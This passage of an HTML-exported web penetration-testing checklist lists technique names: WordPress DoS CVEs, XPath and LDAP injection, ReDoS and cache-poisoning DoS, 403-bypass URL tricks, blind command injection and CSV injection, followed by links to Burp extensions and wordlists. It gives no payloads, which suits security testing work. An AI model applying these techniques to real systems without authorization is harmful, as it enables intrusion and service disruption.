class="indented"></div></li></ul><ul id="134b0a6a-b787-81f0-be9d-cedd62df4d63" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Denial of Service via load-scripts.php</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ef-89ce-d5217a8b8bc0" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">DDOS using xmlrpc.php</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8142-8b95-e59a3778ecf1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">CVE-2018-6389</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-819a-9ef0-d95a5c59ca46" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">CVE-2021-24364</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ff-9ccd-d80fefceba30" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">WP-Cronjob DOS</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-809c-b309-c6647fa844ef" open="" class="toggle" dir="auto"><summary><strong>XPath Injection</strong></summary><div class="indented"><ul id="134b0a6a-b787-81c7-91dc-f2600e1bef8b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XPath injection to bypass authentication</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8193-b0ad-dcdd987e3aed" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">XPath injection to exfiltrate data</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8135-8441-c1748d1b1c02" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Blind and Time-based XPath injections to exfiltrate data</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-80e2-aea4-fbcbf025aef7" open="" class="toggle" dir="auto"><summary><strong>LDAP Injection</strong></summary><div class="indented"><ul id="134b0a6a-b787-815f-ad5a-e0360c7f910e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LDAP injection to bypass authentication</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-811b-9438-dcc67e41e029" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">LDAP injection to exfiltrate data</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-80ac-83da-f7197cb20ed8" open="" class="toggle" dir="auto"><summary><strong>Denial of Service</strong></summary><div class="indented"><ul id="134b0a6a-b787-81bd-85a0-c88babb705b9" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Cookie bomb</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8107-a6b2-c1d75610d0d8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Pixel flood, using image with a huge pixels</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-814c-b218-c8387be85c7a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Frame flood, using GIF with a huge frame</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8109-9cd3-c88cfbc03e57" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">ReDoS (Regex DoS)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-812d-a4a2-de037abf26f8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">CPDoS (Cache Poisoned Denial of Service)</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-80ca-9b0a-d5247872543d" open="" class="toggle" dir="auto"><summary><strong>403 Bypass</strong></summary><div class="indented"><ul id="134b0a6a-b787-8159-ae98-cacf87a5a767" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Using &quot;X-Original-URL&quot; header</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-814f-b6e8-d860c2f0e4e1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Appending <strong>%2e</strong> after the first slash</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8125-b19a-cab5f0924eab" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try add dot (.) slash (/) and semicolon (;) in the URL</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-819b-9fe8-f8ccbc23703f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Add &quot;..;/&quot; after the directory name</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8159-b846-c396f458603a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Try to uppercase the alphabet in the url</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8125-b109-c55879eca0d8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Tool-<strong><a href="https://github.com/daffainfo/bypass-403">bypass-403</a></strong></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b1-b93a-cdf3c4ebd385" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Burp Extension-<a href="https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122">403 Bypasser</a></span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-805c-9b6d-cc397070e9cc" open="" class="toggle" dir="auto"><summary><strong>Other Test Cases (All Categories)</strong></summary><div class="indented"><details id="134b0a6a-b787-818d-9a77-f3f3a10b29cb" open="" class="toggle" dir="auto"><summary>Testing for Role authorization</summary><div class="indented"><ul id="134b0a6a-b787-81f6-b53d-cbc213e79ce3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Check if normal user can access the resources of high privileged users?</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8172-9851-d7c65cb966dc" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Forced browsing</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-812d-a96f-e020ac56320b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Insecure direct object reference</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8192-90d9-f72961c28a2a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Parameter tampering to switch user account to high privileged user</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81ce-a027-de40abb5577f" open="" class="toggle" dir="auto"><summary>Check for security headers and at least</summary><div class="indented"><ul id="134b0a6a-b787-812d-af7d-c11a0460462f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">X Frame Options</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-811f-b854-c78bdb4c497b" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">X-XSS header</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81b3-94c2-e23762efd8eb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">HSTS header</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-819b-bd65-c2faeea871ec" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">CSP header</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8132-ada7-caf944226ccb" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Referrer Policy</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8197-aafe-dda8a175fcfd" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Cache Control</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8189-94cb-c5937c4a7c51" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Public key pins</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8184-b3f3-c2a44fe3abaa" open="" class="toggle" dir="auto"><summary>Blind OS command injection</summary><div class="indented"><ul id="134b0a6a-b787-817b-a20d-eb5893ba4884" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">using time delays</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81be-bd47-ea26ded9db41" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">by redirecting output</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816d-8ee4-d22555065458" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">with out-of-band interaction</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81c8-a42a-f8f3494f289f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">with out-of-band data exfiltration</span><div class="indented"></div></li></ul></div></details><ul id="134b0a6a-b787-817f-8f54-db400f7d84f6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Command injection on CSV export (Upload/Download)</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816b-9d8b-df1200a6d694" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">CSV Excel Macro Injection</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8165-a361-ddb713aa5a8f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">If you find phpinfo.php file, check for the configuration leakage and try to exploit any network vulnerability.</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f4-9c1a-e65afeefaf91" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Parameter Pollution Social Media Sharing Buttons</span><div class="indented"></div></li></ul><details id="134b0a6a-b787-8118-a835-e4035b0448c6" open="" class="toggle" dir="auto"><summary>Broken Cryptography</summary><div class="indented"><ul id="134b0a6a-b787-8151-86cc-fcd2cd1e1e7e" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Cryptography Implementation Flaw</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-810f-8fde-c6a1c36e5032" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Encrypted Information Compromised</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8140-b496-dc0305a5a4a8" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Weak Ciphers Used for Encryption</span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-81e8-957d-eefb34e0f854" open="" class="toggle" dir="auto"><summary>Web Services Testing</summary><div class="indented"><ul id="134b0a6a-b787-81a0-a875-ef62a06a5ebe" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Test for directory traversal</span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8184-a8aa-fb0dea95620a" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked">Web services documentation disclosure Enumeration of services, data types, input types boundaries and limits</span><div class="indented"></div></li></ul></div></details></div></details><details id="134b0a6a-b787-80e2-bf77-eb1f7f1e8b09" open="" class="toggle" dir="auto"><summary><strong>Burp Suite Extensions</strong></summary><div class="indented"><details id="134b0a6a-b787-812e-bfba-d3c711af960d" open="" class="toggle" dir="auto"><summary>Scanners</summary><div class="indented"><ul id="134b0a6a-b787-81e8-b5e0-d901e12c3919" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/albinowax/ActiveScanPlusPlus">https://github.com/albinowax/ActiveScanPlusPlus</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8132-80b4-dec160019977" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/portswigger/additional-scanner-checks">https://github.com/portswigger/additional-scanner-checks</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-8117-b15c-ca99b85dfefc" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/PortSwigger/backslash-powered-scanner">https://github.com/PortSwigger/backslash-powered-scanner</a></span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-8198-b3ed-e9f13b1b3fc1" open="" class="toggle" dir="auto"><summary>Information Gathering</summary><div class="indented"><ul id="134b0a6a-b787-8147-ba0c-d27f9c907ea1" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/capt-meelo/filter-options-method">https://github.com/capt-meelo/filter-options-method</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-816c-a783-ec8bf2cddddf" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/moeinfatehi/Admin-Panel_Finder">https://github.com/moeinfatehi/Admin-Panel_Finder</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81e0-b49c-e7da0b4cef1f" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/raise-isayan/BigIPDiscover">https://github.com/raise-isayan/BigIPDiscover</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81fc-8149-d0fb482078fd" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/P3GLEG/PwnBack">https://github.com/P3GLEG/PwnBack</a></span><div class="indented"></div></li></ul></div></details><details id="134b0a6a-b787-811c-9975-ceec661eaf6e" open="" class="toggle" dir="auto"><summary>Vulnerability Analysis</summary><div class="indented"></div></details></div></details><details id="134b0a6a-b787-8071-b35d-e6c0b5fceb2e" open="" class="toggle" dir="auto"><summary><strong>Wordlists</strong></summary><div class="indented"><ul id="134b0a6a-b787-817a-9520-dae63d6bce55" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81f1-bc7e-f4a2ec688be6" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/Karanxa/Bug-Bounty-Wordlists">https://github.com/Karanxa/Bug-Bounty-Wordlists</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81dc-a1c0-fc0fdf710594" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/0xPugazh/fuzz4bounty">https://github.com/0xPugazh/fuzz4bounty</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81ab-987e-f1b97539fc45" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></span><div class="indented"></div></li></ul><ul id="134b0a6a-b787-81bf-aa80-c386fb9adcd3" class="to-do-list" dir="auto"><li><input type="checkbox" class="checkbox checkbox-off" disabled=""/> <span class="to-do-children-unchecked"><a href="https://github.com/six2dez/OneListForAll">https://github.com/six2dez/OneListForAll</a></span><div class="indented"></div></li></ul></div></details></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
